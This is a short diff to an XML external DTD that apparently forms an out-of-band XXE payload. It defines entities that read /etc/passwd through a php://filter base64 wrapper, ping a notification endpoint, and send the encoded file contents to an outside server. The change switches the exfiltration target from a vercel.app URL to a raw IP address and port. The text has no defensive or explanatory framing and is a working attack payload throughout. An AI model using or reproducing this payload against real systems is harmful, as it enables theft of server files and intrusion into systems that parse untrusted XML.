@@ -7,5 +7,5 @@
 <!ENTITY % zfile SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % confirm1 SYSTEM "https://dianbao.vercel.app/send/3AD2781AD6E69/ESON_head">
 		%confirm1;
-<!ENTITY % al "<!ENTITY hello SYSTEM 'https://dianbao.vercel.app/send/3AD2781AD6E69/ESON%zfile;'>">
+<!ENTITY % al "<!ENTITY hello SYSTEM 'http://121.40.57.125:23333/?echo=%zfile;'>">
 		%al;
